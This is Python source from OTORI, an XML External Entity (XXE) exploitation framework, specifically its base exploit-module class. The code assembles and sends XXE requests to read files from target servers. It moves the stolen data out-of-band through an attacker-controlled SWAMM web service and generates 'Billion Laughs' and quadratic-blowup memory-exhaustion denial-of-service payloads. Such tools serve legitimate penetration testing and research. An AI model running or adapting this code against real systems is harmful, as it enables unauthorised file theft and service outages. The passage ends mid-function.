#!/usr/bin/python

# On The Outside, Reaching In ("OTORI")
# Copyright 2014 Ben Lincoln
# http://www.beneaththewaves.net/
#

# This file is part of On The Outside, Reaching In ("OTORI").

# On The Outside, Reaching In ("OTORI") is free software: you can redistribute it and/or modify
# it under the terms of version 3 of the GNU General Public License as published by
# the Free Software Foundation.

# On The Outside, Reaching In ("OTORI") is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with On The Outside, Reaching In ("OTORI") (in the file LICENSE.txt).  
# If not, see <http://www.gnu.org/licenses/>.

import base64
import httplib
import inspect
import os
import random
import re
import sys
import time
import urllib

import libdeceitfulhttp
import libdeceitfulnetwork
import libfileio
import liboutput
import libswamm

class XXEModuleError(Exception):
    def __init__(self, msg):
	Exception.__init__(self)
        self.msg = msg

class XXEExploitModuleOption:
	def __init__(self):
		self.Number = 0
		self.Name = ''
		self.Description = ''
		self.CurrentValue = None
		self.Required = False
	def __repr__(self):
                return repr((self.Number, self.Name, self.Description, self.CurrentValue))

class XMLTagFactory:
	
	def __init__(self):
		self.XMLlTagGenerator = libdeceitfulhttp.RandomXMLTagGenerator()
		self.UsedTags = []

	def GetNextUnusedTag(self):
		result = self.XMLlTagGenerator.generateTag()
		while result in self.UsedTags:
			result = self.XMLlTagGenerator.generateTag()
		self.UsedTags.append(result)
		return result

class XXEResponse:
	
	RESPONSE_OK = 0
	RESPONSE_NOTFOUND = 1
	RESPONSE_NOACCESS = 2
	RESPONSE_UNREADABLE = 4
	RESPONSE_BLACKLISTED = 8
	RESPONSE_DEPTHEXCEEDED = 16
	RESPONSE_NOCONTENT = 32
	RESPONSE_LOCALFILEEXISTS = 64
	RESPONSE_TOOLARGE = 128
	RESPONSE_TIMEOUT = 256
	RESPONSE_ENTITY_REFERENCE_LOOP = 512
	RESPONSE_OUT_OF_MEMORY = 1024
	RESPONSE_NETWORK_ERROR = 2048
	RESPONSE_UNKNOWN_FAILURE = 4096
	
	def __init__(self):
		self.OriginalRelativePath = ''
		self.LocalPath = ''
		self.LocalSize = 0
		self.IsDirectory = False
		self.XXETarget = ''
		self.ReturnCode = XXEResponse.RESPONSE_OK
		self.ResponseBody = ''
		self.ParsedResponse = ''
		self.NetworkLevelResponse = libdeceitfulnetwork.NetworkLevelResponse()
		self.OverallRequestSucceeded = False
		
	@staticmethod
	def CloneWithoutResponseText(sourceResponse):
		result = XXEResponse()
		result.OriginalRelativePath = sourceResponse.OriginalRelativePath
		result.LocalPath = sourceResponse.LocalPath
		result.LocalSize = sourceResponse.LocalSize
		result.IsDirectory = sourceResponse.IsDirectory
		result.XXETarget = sourceResponse.XXETarget
		result.ReturnCode = sourceResponse.ReturnCode
		result.NetworkLevelResponse = sourceResponse.NetworkLevelResponse
		return result
		
	@staticmethod
	def GetReturnCodeTypeName(returnCode):
		if (returnCode == XXEResponse.RESPONSE_OK):
			return "OK"
		if (returnCode == XXEResponse.RESPONSE_NOTFOUND):
			return "Not Found"
		if (returnCode == XXEResponse.RESPONSE_NOACCESS):
			return "Inaccessible"
		if (returnCode == XXEResponse.RESPONSE_UNREADABLE):
			return "Unreadable Content"
		if (returnCode == XXEResponse.RESPONSE_BLACKLISTED):
			return "Blacklisted URI"
		if (returnCode == XXEResponse.RESPONSE_DEPTHEXCEEDED):
			return "Recursion Depth Exceeded"
		if (returnCode == XXEResponse.RESPONSE_NOCONTENT):
			return "File or Directory Had No Content"
		if (returnCode == XXEResponse.RESPONSE_LOCALFILEEXISTS):
			return "Local File Already Exists"
		if (returnCode == XXEResponse.RESPONSE_TOOLARGE):
			return "Remote File Too Large To Access Via This Module"
		if (returnCode == XXEResponse.RESPONSE_TIMEOUT):
			return "Timed Out"
		if (returnCode == XXEResponse.RESPONSE_ENTITY_REFERENCE_LOOP):
			return "Entity Reference Loop"
		if (returnCode == XXEResponse.RESPONSE_OUT_OF_MEMORY):
			return "Out-Of-Memory Condition On The Target System"
		if (returnCode == XXEResponse.RESPONSE_NETWORK_ERROR):
			return "Network-Level Error"
		if (returnCode == XXEResponse.RESPONSE_UNKNOWN_FAILURE):
			return "Unexpected Error"
			
		return "Unknown"
	
	@staticmethod
	def GetUnknownFailureResponse(xxeTarget):
		failedResult = XXEResponse()
		failedResult.XXETarget = xxeTarget
		failedResult.ReturnCode = XXEResponse.RESPONSE_UNKNOWN_FAILURE
		return failedResult

class ResponseParserSettings:
	def __init__(self):
		self.ParserRegexStrings = {}
		self.ParserRegexStrings['FILE_NOT_FOUND'] = ''
		self.ParserRegexStrings['NO_ACCESS'] = ''
		self.ParserRegexStrings['UNREADABLE'] = ''
		self.ParserRegexStrings['ENTITY_REFERENCE_LOOP'] = ''
		self.ParserRegexStrings['OUT_OF_MEMORY'] = ''
		
class ResponseParserSettingsJava(ResponseParserSettings):
	def __init__(self):
		ResponseParserSettings.__init__(self)
		self.ParserRegexStrings['FILE_NOT_FOUND'] = '(not found|notfound|file not|filenot|no such|not a directory)'
		self.ParserRegexStrings['NO_ACCESS'] = '(access|denied|permission)'
		self.ParserRegexStrings['UNREADABLE'] = '(binary|unexpected|expected keyword|invalid|byte|conversion)'
		self.ParserRegexStrings['OUT_OF_MEMORY'] = '(outofmemory|heap space)'

class ResponseParserSettingsPHP(ResponseParserSettings):
	def __init__(self):
		ResponseParserSettings.__init__(self)
		self.ParserRegexStrings['FILE_NOT_FOUND'] = '(not found|notfound|file not|filenot|no such|not a directory)'
		self.ParserRegexStrings['NO_ACCESS'] = '(access|denied|permission)'
		self.ParserRegexStrings['UNREADABLE'] = '(binary|unexpected|expected keyword|invalid|byte|conversion)'
		self.ParserRegexStrings['OUT_OF_MEMORY'] = '(outofmemory|heap space)'
		self.ParserRegexStrings['ENTITY_REFERENCE_LOOP'] = 'reference loop'

# base class for exploit modules
# cannot be used on its own in any useful way
class XXEExploitModule:
	
	def __init__(self, uid, name):
		self.uniqueID = uid
		self.name = name
		self.BaseDataDirectory = '/data/otori'
		self.ModuleDataDirectory = self.BaseDataDirectory + '/modules/{0}/'.format(self.uniqueID)
		self.RequestTimeout = 30
		self.SupportsDirectoryListings = False
		self.Options = []
		self.MultiLogger = None
		self.XMLTagFactory = XMLTagFactory()
		self.RequiresSWAMM = False
		self.SWAMMURLs = libswamm.SWAMMURLSet()
		self.RandomUniqueTextGenerator = liboutput.RandomUniqueTextGenerator()
		self.SWAMMIDLength = 3
		self.ShortDelimiterLength = 5
		self.SWAMMReflectedFilePrefix = '{0}/'.format(self.RandomUniqueTextGenerator.GetNextUnusedText(self.SWAMMIDLength))
		self.SWAMMReflectedXMLFileName = '{0}{1}.xml'.format(self.SWAMMReflectedFilePrefix, self.RandomUniqueTextGenerator.GetNextUnusedText(self.SWAMMIDLength))
		self.SWAMMReceiverID = self.RandomUniqueTextGenerator.GetNextUnusedText(self.SWAMMIDLength)
		self.SWAMMStoredRequestID = self.RandomUniqueTextGenerator.GetNextUnusedText(self.SWAMMIDLength)
		self.ShortDelimiter = self.RandomUniqueTextGenerator.GetNextUnusedText(self.ShortDelimiterLength)
		self.SWAMMMaxRetries = 3
		self.SWAMMRetryDelay = 1
		
	def SetParentOtoriInstance(self, otoriInstance):
		self.OtoriInstance = otoriInstance
		self.MultiLogger = self.OtoriInstance.MultiLogger
		self.RequestTimeout = self.OtoriInstance.RequestTimeout
		self.RandomUniqueTextGenerator.MultiLogger = self.OtoriInstance.MultiLogger
		
	def SetOptionsFromCommandLineArgs(self, args):
		print 'NOT IMPLEMENTED'
		
	def AddOption(self, optionNumber, optionName, optionDescription, defaultValue, required):
		newOption = XXEExploitModuleOption()
		newOption.Number = optionNumber
		newOption.Name = optionName
		newOption.Description = optionDescription
		newOption.CurrentValue = defaultValue
		newOption.Required = required
		self.Options.append(newOption)
		
	def AddNextOption(self, optionName, optionDescription, defaultValue, required):
		nextOptionNum = 0
		for o in self.Options:
			if (o.Number > nextOptionNum):
				nextOptionNum = o.Number + 1
		self.AddOption(nextOptionNum, optionName, optionDescription, defaultValue, required)

	def GetOptionByName(self, optionName):
		for o in self.Options:
			if (o.Name == optionName):
				return o
		return None

	def SetOption(self, option):
		foundOption = False
		for o in self.Options:
			if (o.Name == option.Name):
				o = option
				foundOption = True
		if not (foundOption):
			#self.AddNextOption(o.Name, o.Description, o.CurrentValue, o.Required)
			raise XXEModuleError('Error - unfinished code - could not update nonexistent option name "' + option.Name + '"')
		
	def GetRequiredParameters(self):
		result = []
		for o in self.Options:
			if (o.Required):
				result.append(o)
		return result
		
	def GetOptionalParameters(self):
		result = []
		for o in self.Options:
			if not (o.Required):
				result.append(o)
		return result
			
	def SetRequiredParameter(self, argArray, optionName, position):
		self.LogDebug('Received request to change the value of required parameter "{0}"'.format(optionName))
		if (len(argArray) < (position + 1)):
			errMsg = 'A parameter ("{0}") was required at position {1}, but the set of arguments does not have that many elements'.format(optionName, position)
			self.LogCritical(errMsg, isFatal = True)
			#raise XXEModuleError(errMsg)
		parm = self.GetOptionByName(optionName)
		if not (parm):
			errMsg = 'A parameter ("{0}") was required at position {1}, but this module does not have a parameter with that name'.format(optionName, position)
			self.LogCritical(errMsg, isFatal = True)
			#raise XXEModuleError(errMsg)
		self.LogDebug('Current value is "{0}"'.format(parm.CurrentValue))
		parm.CurrentValue = argArray[position]
		self.LogDebug('New value is "{0}"'.format(parm.CurrentValue))
		self.SetOption(parm)

	def SetOptionalParameter(self, argArray, optionName, position):
		self.LogDebug('Received request to change the value of optional parameter "{0}"'.format(optionName))
		setOption = True
		if (len(argArray) < (position + 1)):
			errMsg = 'An optional parameter ("{0}") could have been specified at position {1}, but the set of arguments does not have that many elements'.format(optionName, position)
			self.LogDebug(errMsg)
			#return None
			setOption = False
		parm = self.GetOptionByName(optionName)
		if not (parm):
			errMsg = 'A optional parameter ("{0}") could have been specified at position {1}, but this module does not have a parameter with that name'.format(optionName, position)
			self.LogDebug(errMsg)
			return None
			#setOption = False
		self.LogDebug('Current value is "{0}"'.format(parm.CurrentValue))
		if (setOption):
			parm.CurrentValue = argArray[position]
			self.LogDebug('New value is "{0}"'.format(parm.CurrentValue))
			self.SetOption(parm)
		else:
			self.LogDebug('Value will not be changed because none was specified by the user')

	def SWAMMSendRequest(self, httpRequest):
		self.LogDebug('Sending SWAMM request')
		succeeded = False
		attemptCount = 0
		maxAttempts = self.SWAMMMaxRetries + 1
		result = libdeceitfulhttp.HTTPResponse()
		while not (succeeded):
			result = self.DeceitfulHTTPClient.SendRequest(httpRequest)
			self.LogDebug('SWAMM request response code was {0}'.format(result.ResponseCode))
			if (result.ResponseCode == 200):
				succeeded = True
				return result
			attemptCount = attemptCount + 1
			self.LogDebug('SWAMM request was not successful (attempt {0} of {1})'.format(attemptCount, maxAttempts))
			if (attemptCount >= maxAttempts):
				errMsg = 'SWAMM request was not successful after {1} attempts - giving up'.format(maxAttempts)
				self.LogError(errMsg)
				raise XXEModuleError(errMsg)
			time.sleep(self.SWAMMRetryDelay)
		return result
		
		
	def SWAMMRead(self, swammID):
		targetURL = self.SWAMMURLs.ReadURL + swammID
		req = self.DeceitfulHTTPClient.BuildRequest('GET', targetURL, {}, None)
		return self.SWAMMSendRequest(req)
		
	def SWAMMWrite(self, swammID):
		targetURL = self.SWAMMURLs.WriteURL + swammID
		req = self.DeceitfulHTTPClient.BuildRequest('GET', targetURL, {}, None)
		return self.SWAMMSendRequest(req)
		
	def SWAMMAppend(self, swammID):
		targetURL = self.SWAMMURLs.AppendURL + swammID
		req = self.DeceitfulHTTPClient.BuildRequest('GET', targetURL, {}, None)
		return self.SWAMMSendRequest(req)
		
	def SWAMMStoreBasicRequestResponsePair(self, pairID, uriStem, uriRegex, httpResponse):
		srrp = libswamm.StoredRequestResponsePair()
		srrp.Request.HTTPMethod = 'GET'
		# determine the base URI stem from the full base URL
		swammBaseURIStem = ''
		try:
			uc = libdeceitfulhttp.URLComponents.FromURL(self.SWAMMURLs.BaseURL)
			swammBaseURIStem = uc.URIStem
		except:
			swammBaseURIStem = ''
		if (uriRegex):
			srrp.RequestURLRegex = '{0}{1}'.format(swammBaseURIStem, uriRegex)
		else:
			srrp.RequestURLRegex = None
		if (uriStem):
			srrp.Request.URL = '{0}{1}'.format(swammBaseURIStem, uriStem)
		else:
			srrp.Request.URL = None
		# eliminate redundant forward slashes
		if (len(swammBaseURIStem) > 0):
			if (liboutput.OutputUtils.Right(swammBaseURIStem, 1) == '/'):
				if (uriRegex):
					if (len(uriRegex) > 0):
						if (liboutput.OutputUtils.Left(uriRegex, 1) == '/'):
							srrp.RequestURLRegex = '{0}{1}'.format(liboutput.OutputUtils.LeftLess(swammBaseURIStem, 1), uriRegex)
				if (uriStem):
					if (len(uriStem) > 0):
						if (liboutput.OutputUtils.Left(uriStem, 1) == '/'):
							srrp.Request.URL = '{0}{1}'.format(liboutput.OutputUtils.LeftLess(swammBaseURIStem, 1), uriStem)
		#srrp.RequestURLRegex = uriRegex
		#srrp.Request.URL = uriStem
		#print 'Debug: srrp.RequestURLRegex = "{0}"'.format(srrp.RequestURLRegex)
		#print 'Debug: srrp.Request.URL = "{0}"'.format(srrp.Request.URL)
		srrp.Response = httpResponse
		storedPair = srrp.ToSWAMMStoredMessage()
		targetURL = self.SWAMMURLs.StoreAddURL + pairID
		req = self.DeceitfulHTTPClient.BuildRequest('GET', targetURL, {}, storedPair)
		return self.SWAMMSendRequest(req)
		
		
	def SWAMMDeleteRequestResponsePairByID(self, pairID):
		targetURL = self.SWAMMURLs.StoreDeleteURL + pairID
		req = self.DeceitfulHTTPClient.BuildRequest('GET', targetURL, {}, None)
		return self.SWAMMSendRequest(req)

	def SWAMMRetrieveOOBData(self, messageVariables, httpHeaders, responseParserSettings, directResponseFromTargetSystem):
		targetURL = '{0}{1}'.format(self.SWAMMURLs.ReadURL, self.SWAMMReceiverID)
		self.LogDebug('Target URL for out-of-band read is "{0}"'.format(targetURL))
		swammOOBResponse = self.SendRequest("GET", targetURL, None, httpHeaders)
		
		if (swammOOBResponse.ResponseCode != 200):
			self.LogWarning('Got a response code of {0} instead of 200 when trying to read the data for "{1}" from SWAMM'.format(swammOOBResponse.ResponseCode, messageVariables['%XXETARGET%']))
			result = self.ParseDelimitedResponse(messageVariables, directResponseFromTargetSystem, responseParserSettings, delimiterText = messageVariables['%SHORTDELIMITER%'], base64DecodeBody = True)
		else:
			result = self.ParseDelimitedResponse(messageVariables, swammOOBResponse, responseParserSettings, delimiterText = messageVariables['%SHORTDELIMITER%'], base64DecodeBody = True)
		return result

	def SWAMMDeleteOOBData(self, messageVariables, httpHeaders):
		# delete the OOB data now that it's been retrieved
		targetURL = '{0}{1}'.format(self.SWAMMURLs.DeleteURL, self.SWAMMReceiverID)
		self.LogDebug('Target URL for out-of-band data delete is "{0}"'.format(targetURL))
		deleteResponse = self.SendRequest("GET", targetURL, None, httpHeaders)

		if ((deleteResponse.ResponseCode == 200)):
			self.LogDebug('Got a response code of {0} when trying to delete the stored data for "{1}" from SWAMM - this generally indicates success'.format(deleteResponse.ResponseCode, messageVariables['%XXETARGET%']))
		else:
			self.LogWarning('Got a response code of {0} when trying to read the data for "{1}" from SWAMM - the data may not have been deleted'.format(deleteResponse.ResponseCode, messageVariables['%XXETARGET%']))
			
		# double-check to make sure it's really deleted
		targetURL = '{0}{1}'.format(self.SWAMMURLs.ReadURL, self.SWAMMReceiverID)
		self.LogDebug('Target URL for OOB read is "{0}"'.format(targetURL))
		swammOOBResponse = self.SendRequest("GET", targetURL, None, httpHeaders)
		
		if (swammOOBResponse.ResponseCode == 404):
			self.LogDebug('Out-of-band data was successfully deleted from the SWAMM instance')
		else:
			self.LogWarning('The out-of-band data at "{0}" was not successfully deleted from the SWAMM instance - there is a small chance that this may cause inaccurate results for other files downloaded during this session'.format(self.SWAMMURLs.ReadURL))
	
		
	def ActualizeTemplate(self, template, variables):
		return liboutput.OutputUtils.ActualizeTemplate(template, variables)
		
	def GetStandardXXEMessageVariables(self, isSystemEntity):
		result = {}
		# XML tags
		result['%DOCTYPE%'] = self.XMLTagFactory.GetNextUnusedTag()
		result['%ELEMENT%'] = self.XMLTagFactory.GetNextUnusedTag()
		result['%ENTITY%'] = self.XMLTagFactory.GetNextUnusedTag()
		result['%DELIMITER%'] = self.XMLTagFactory.GetNextUnusedTag()
		result['%YOPAYLOADENTITY%'] = self.XMLTagFactory.GetNextUnusedTag()
		result['%YOPARAMETERENTITY%'] = self.XMLTagFactory.GetNextUnusedTag()
		result['%YOEXTERNALENTITY%'] = self.XMLTagFactory.GetNextUnusedTag()
		result['%YOREMOTEENTITY%'] = self.XMLTagFactory.GetNextUnusedTag()

		# SWAMM URLs
		result['%SWAMMBASEURL%'] = self.SWAMMURLs.BaseURL
		result['%SWAMMREADURL%'] = self.SWAMMURLs.ReadURL
		result['%SWAMMWRITEURL%'] = self.SWAMMURLs.WriteURL
		result['%SWAMMAPPENDURL%'] = self.SWAMMURLs.AppendURL
		result['%SWAMMDELETEURL%'] = self.SWAMMURLs.DeleteURL
		result['%SWAMMSTOREADDURL%'] = self.SWAMMURLs.StoreAddURL
		result['%SWAMMSTOREDELETEURL%'] = self.SWAMMURLs.StoreDeleteURL
		
		# short random IDs
		result['%SWAMMRECEIVERID%'] = self.SWAMMReceiverID
		result['%SWAMMSTOREDREQUESTID%'] = self.SWAMMStoredRequestID
		result['%SHORTDELIMITER%'] = self.ShortDelimiter
		
		# system entity (or not)
		if (isSystemEntity):
			result['%ISSYSTEMENTITY%'] = 'SYSTEM '
		else:
			result['%ISSYSTEMENTITY%'] = ''

		# optional values which are blank unless the module overrides them
			
		return result
				
	# this is the main method that should be implemented in all usable modules
	# sub-classes which implement this function should return an XXEResponse object
	def SendXXEMessage(self, messageVariables, isSystemEntity):
		raise XXEModuleError('NOT_IMPLEMENTED')

	# can be overridden in subclasses if the basic block won't work
	def GetXXEDefinitionTemplateBlock(self):
		return self.GetBasicXXEDefinitionTemplateBlock()

	# can be overridden in subclasses if the basic block won't work
	def GetXXEReferenceTemplateBlock(self):
		return '&%ENTITY%;'

	def GetXXEMessageVariables(self, isSystemEntity):
		return self.GetStandardXXEMessageVariables(isSystemEntity)
		
	# sub-classes can also override this specific wrapper if there is a really good reason to do so
	# e.g. NONE of the standard code will work in the case of this specific XXE vulnerability
	# hopefully such issues are extremely unusual
	def GetURIViaXXE(self, uri):
		messageVariables = self.GetXXEMessageVariables(True)
		messageVariables['%XXETARGET%'] = uri
		#messageVariables['%ENTITYDEFINITIONBLOCK%'] = self.GetXXEDefinitionTemplateBlock(True)
		messageVariables['%ENTITYDEFINITIONBLOCK%'] = self.GetXXEDefinitionTemplateBlock()
		messageVariables['%ENTITYREFERENCEBLOCK%'] = self.GetXXEReferenceTemplateBlock()
		return self.SendXXEMessage(messageVariables, True)
		
	# sub-classes can also override this specific wrapper if there is a really good reason to do so (the generic definition block won't work, etc.)
	def GetTextEntityViaXXE(self, entityReplacementText, entityName = None):
		messageVariables = self.GetXXEMessageVariables(False)
		messageVariables['%XXETARGET%'] = entityReplacementText
		messageVariables['%ENTITYDEFINITIONBLOCK%'] = self.GetXXEDefinitionTemplateBlock()
		messageVariables['%ENTITYREFERENCEBLOCK%'] = self.GetXXEReferenceTemplateBlock()
		# if a specific entity name was specified, use it - otherwise use the default random value
		if (entityName):
			messageVariables['%ENTITY%'] = entityName
		return self.SendXXEMessage(messageVariables, False)
	
	# sub-classes can also override this specific wrapper if there is a really good reason to do so (the generic definition block won't work, etc.)
	def SendDoSLulz(self, lulzBase, lulzExp, lulzString):
		messageVariables = self.GetXXEMessageVariables(False)
		messageVariables['%XXETARGET%'] = '"Billion Laughs" memory-exhaustion denial-of-service'
		messageVariables['%ENTITYDEFINITIONBLOCK%'] = self.GenerateLulzEntityDefinitionTemplateBlock(lulzBase, lulzExp, lulzString)
		messageVariables['%ENTITYREFERENCEBLOCK%'] = self.GetXXEReferenceTemplateBlock()
		return self.SendXXEMessage(messageVariables, False)

	# sub-classes can also override this specific wrapper if there is a really good reason to do so (the generic definition block won't work, etc.)
	def SendDoSQuadraticBlowup(self, quadBase, quadMultiplier, lulzString):
		messageVariables = self.GetXXEMessageVariables(False)
		messageVariables['%XXETARGET%'] = '"Quadratic Blowup" memory-exhaustion denial-of-service'
		messageVariables['%ENTITYDEFINITIONBLOCK%'] = self.GenerateQuadraticBlowupEntityDefinitionTemplateBlock(quadBase, lulzString)
		messageVariables['%ENTITYREFERENCEBLOCK%'] = self.GenerateQuadraticBlowupEntityReferenceBlock(quadMultiplier)
		return self.SendXXEMessage(messageVariables, False)

	def PerformCleanup(self):
		return 'NOT_IMPLEMENTED'


	def GetBasicXXEDefinitionTemplateBlock(self):
		result = self.GetBaseDataFile('xxe-entity-basic.txt')
		return result
		
	# See "XML Data Retrieval" (pages 5-9) and "XML Out-Of-Band Data Retrieval", Timur Yunusov and Alexey Osipov, Black Hat EU 2013
	def GetYunusovOsipovType1ReflectedXXEDefinitionTemplateBlock(self):
		result = self.GetBaseDataFile('xxe-entity-yunusov-osipov-type_01-reflected.txt')
		return result
		
	def GetYunusovOsipovType1MainXXEDefinitionTemplateBlock(self):
		result = self.GetBaseDataFile('xxe-entity-yunusov-osipov-type_01-main.txt')
		return result		
		
	def GetYunusovOsipovType2ReflectedXXEDefinitionTemplateBlock(self):
		result = self.GetBaseDataFile('xxe-entity-yunusov-osipov-type_02-reflected.txt')
		return result	

	def GetYunusovOsipovType2MainXXEDefinitionTemplateBlock(self):
		result = self.GetBaseDataFile('xxe-entity-yunusov-osipov-type_02-main.txt')
		return result

		
	def GenerateLulzEntityDefinitionTemplateBlock(self, lulzBase, lulzExp, lulzString):
		result = ''
		currentEntity = ''
		for exp in range(1, (lulzExp + 1)):
			currentLine = ''
			previousEntity = '&%ENTITY%' + str(exp-1) + ';'
			if (exp == 1):
				previousEntity = lulzString
			currentEntity = '%ENTITY%' + str(exp)
			if (exp == lulzExp):
				currentEntity = '%ENTITY%'
			for base in range(0, lulzBase):
				currentLine = currentLine + previousEntity
			result = result + '\t<!ENTITY ' + currentEntity + ' "' + currentLine + '">\n'
		resultTemplate = self.GetBaseDataFile('xxe-entity-lulz.txt')
		result = resultTemplate.replace('%LULZENTITYDEFINITIONS%', result)
		return result

	def GenerateQuadraticBlowupEntityDefinitionTemplateBlock(self, quadBase, lulzString):
		result = ''
		for i in range(0, quadBase):
			result = result + lulzString
		resultTemplate = self.GetBaseDataFile('xxe-entity-quad.txt')
		result = resultTemplate.replace('%QUADENTITYDEFINITIONS%', result)
		return result
		
	def GenerateQuadraticBlowupEntityReferenceBlock(self, quadMult):
		result = ''
		for i in range(0, quadMult):
			result = result + '&%ENTITY%;'
		return result

	#def GetRawRequestFile(self, filePath):
	#	rawRequestTemplate = libfileio.FileReader.getFileAsString(filePath)
	#	rawRequestTemplate = bodyString.replace('\n', '\r\n')
	#	rawRequestTemplate = bodyString.replace('\r\r\n', '\r\n')
	
	def GetTemplateHTTPRequestFromFile(self, filePath):
		rawRequestTemplate = libfileio.FileReader.getFileAsString(filePath)
		templateRequest = libdeceitfulhttp.HTTPRequest.FromRawTCPMessage(rawRequestTemplate)
		#print 'debug: body length = {0}'.format(len(templateRequest.Body))
		if ((templateRequest.Body) and (len(templateRequest.Body) > 0)):
			firstChar = liboutput.OutputUtils.Left(templateRequest.Body, 1)
			#print 'debug: firstChar = #"{0}"'.format(ord(firstChar))
			if ((firstChar == '\r') or (firstChar == '\n')):
				while ((firstChar == '\r') or (firstChar == '\n')):
					templateRequest.Body = liboutput.OutputUtils.RightLess(templateRequest.Body, 1)
					firstChar = liboutput.OutputUtils.Left(templateRequest.Body, 1)
		return templateRequest
		
	def GetBaseDataFile(self, fileName):
		filePath = libfileio.FileReader.getAbsoluteFilePathFromModuleBase(self.BaseDataDirectory + '/' + fileName)
		if os.path.exists(filePath):
			try:
				return libfileio.FileReader.getFileAsString(filePath)
			except:
				return 'Error reading exploit module base data file (' + filePath + ')'
		else:
			return ''
			
	def GetModuleDataFile(self, fileName):
		filePath = libfileio.FileReader.getAbsoluteFilePathFromModuleBase(self.ModuleDataDirectory + '/' + fileName)
		if os.path.exists(filePath):
			try:
				return libfileio.FileReader.getFileAsString(filePath)
			except:
				return 'Error reading exploit module data file (' + filePath + ')'
		else:
			return ''
			
	def GetDataOverview(self):
		return self.GetModuleDataFile("details/Overview.txt")

	def GetDataRequiredParameters(self):
		return self.GetModuleDataFile("details/RequiredParameters.txt")

	def GetDataOptionalParameters(self):
		return self.GetModuleDataFile("details/OptionalParameters.txt")

	def GetDataNotesLimitations(self):
		return self.GetModuleDataFile("details/Notes-Limitations.txt")

	def GetDataExamples(self):
		return self.GetModuleDataFile("details/Examples.txt")

	def GetDataTestedTargets(self):
		return self.GetModuleDataFile("details/TestedTargets.txt")

	def GetDataAuthors(self):
		return self.GetModuleDataFile("details/Authors.txt")

	def GetDataVersion(self):
		return self.GetModuleDataFile("details/Version.txt")

	def GetDataReleaseDate(self):
		return self.GetModuleDataFile("details/ReleaseDate.txt")

	def GetDataVulnerabilityDisclosure(self):
		return self.GetModuleDataFile("details/VulnerabilityDisclosure.txt")
		
	def GetDataComments(self):
		return self.GetModuleDataFile("details/Comments.txt")

	def GetDataRelatedModules(self):
		return self.GetModuleDataFile("details/RelatedModules.txt")

		
	def CheckParams(self):
		if (self.OtoriInstance):
			if (self.OtoriInstance.targetURLs[0].strip() != ''):
				return True
		return False

	def ParseErrorResponse(self, xxeTarget, response, responseParserRegexStrings, xxeResponse):
		
		responseBody = response.Body
		resultCode = XXEResponse.RESPONSE_OK
		result = 'Unknown error reading "' + xxeTarget + '"'
		# results that don't require explicit parsing
		if (response.NetworkLevelResponse.Error):
			resultCode = XXEResponse.RESPONSE_NETWORK_ERROR
			result = 'Network-level error - code ' + str(response.NetworkLevelResponse.ResponseCode) + ' - "' + response.NetworkLevelResponse.Message + '"'
		
		# results that require require parsing
		if (responseParserRegexStrings.ParserRegexStrings['NO_ACCESS'] != ''):
			if resultCode < 1:
				rxe = re.compile(responseParserRegexStrings.ParserRegexStrings['NO_ACCESS'], flags=re.IGNORECASE|re.DOTALL)
				matches = rxe.findall(responseBody)
				if matches:
					resultCode = XXEResponse.RESPONSE_NOACCESS
					result = 'Access to the target "' + xxeTarget + '" was denied'
					self.OtoriInstance.MultiLogger.debug(result + ' -Match: ' + str(matches))

		if (responseParserRegexStrings.ParserRegexStrings['UNREADABLE'] != ''):
			if resultCode < 1:
				rxe = re.compile(responseParserRegexStrings.ParserRegexStrings['UNREADABLE'], flags=re.IGNORECASE|re.DOTALL)
				matches = rxe.findall(responseBody)
				if matches:
					resultCode = XXEResponse.RESPONSE_UNREADABLE
					result = 'The target "' + xxeTarget + '" appears to contain data which cannot be accessed via the current XXE module (binary, XML, etc.)'
					self.OtoriInstance.MultiLogger.debug(result + ' - Match: ' + str(matches))

		if (responseParserRegexStrings.ParserRegexStrings['FILE_NOT_FOUND'] != ''):
			if resultCode < 1:
				rxe = re.compile(responseParserRegexStrings.ParserRegexStrings['FILE_NOT_FOUND'], flags=re.IGNORECASE|re.DOTALL)
				matches = rxe.findall(responseBody)
				if matches:
					resultCode = XXEResponse.RESPONSE_NOTFOUND
					result = 'Target "' + xxeTarget + '" was not found'
					self.OtoriInstance.MultiLogger.debug(result + ' -Match: ' + str(matches))

		if (responseParserRegexStrings.ParserRegexStrings['OUT_OF_MEMORY'] != ''):
			if resultCode < 1:
				rxe = re.compile(responseParserRegexStrings.ParserRegexStrings['OUT_OF_MEMORY'], flags=re.IGNORECASE|re.DOTALL)
				matches = rxe.findall(responseBody)
				if matches:
					resultCode = XXEResponse.RESPONSE_OUT_OF_MEMORY
					result = 'An out-of-memory condition was encountered for the request to load "' + xxeTarget + '" - this is the intended result for denial-of-service requests, but if this was a standard request, it most likely indicates that the response was far too large for the target system to insert inline'
					self.OtoriInstance.MultiLogger.debug(result + ' -Match: ' + str(matches))

		if (responseParserRegexStrings.ParserRegexStrings['ENTITY_REFERENCE_LOOP'] != ''):
			if resultCode < 1:
				rxe = re.compile(responseParserRegexStrings.ParserRegexStrings['ENTITY_REFERENCE_LOOP'], flags=re.IGNORECASE|re.DOTALL)
				matches = rxe.findall(responseBody)
				if matches:
					resultCode = XXEResponse.RESPONSE_ENTITY_REFERENCE_LOOP
					result = 'An entity reference loop was encountered in the request to load "' + xxeTarget + '" - this usually indicates that the response was larger than the XML parser component in the target system allows to be inserted inline'
					self.OtoriInstance.MultiLogger.debug(result + ' -Match: ' + str(matches))

		if resultCode < 1:
			resultCode = 1	
			result = 'Unknown error reading "' + xxeTarget + '"'
			self.OtoriInstance.MultiLogger.debug(result)
			
		xxeResponse.ReturnCode = resultCode
		xxeResponse.ParsedResponse = result
		return xxeResponse
		
		
	def ParseDelimitedResponse(self, messageVariables, response, responseParserRegexStrings, delimiterText = None, base64DecodeBody = False):
		
		responseBody = response.Body
		xxeTarget = messageVariables['%XXETARGET%']
		delimiter = messageVariables['%DELIMITER%']
		self.LogDebug('Delimiter variable: "{0}"'.format(delimiter))
		if (delimiterText):
			delimiter = delimiterText
			self.LogDebug('Using explicitly-specific delimiter variable "{0}" instead'.format(delimiter))
		#rexString = '(' + delimiter + ')' + '(.*?)' + '(' + delimiter + ')'
		#rexString = '({0})(.*?)({1})'.format(delimiter, delimiter)
		rexString = '(?<={0})(.*?)(?={1})'.format(delimiter, delimiter)
		self.LogDebug('Delimiter regex: "{0}"'.format(rexString))
		
		result = 'Error: unknown error reading "' + xxeTarget + '"'
		resultCode = XXEResponse.RESPONSE_OK
	
		#rx = re.compile(rexString, flags=re.DOTALL|re.MULTILINE)
